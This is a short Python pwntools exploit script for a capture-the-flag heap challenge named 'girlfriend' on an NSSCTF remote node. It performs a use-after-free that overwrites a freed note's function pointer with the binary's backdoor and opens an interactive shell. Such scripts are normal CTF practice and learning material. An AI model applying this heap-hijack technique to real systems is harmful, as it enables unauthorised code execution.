from pwn import *
elf = ELF('./girlfriend')
# io =gdb.debug('./girlfriend')
io = remote('node4.anna.nssctf.cn',28659)
def add(size,content):
    io.sendlineafter(b'choice :',b'1')
    io.sendlineafter(b'is :',str(int(size)))
    io.sendlineafter(b'is :',content)
    
def free(idx):
    io.sendlineafter(b'choice :',b'2')
    io.sendlineafter(b'Index :',str(int(idx)))

def show(idx):
    io.sendlineafter(b'choice :',b'3')
    io.sendlineafter(b'Index :',str(int(idx)))

add(0x10,b'admin')
add(0x10,b'bdmin')

free(0)
free(1)
add(0x20,b'cdmin')
add(0x10,p64(elf.sym['backdoor']))
show(0)

io.interactive()
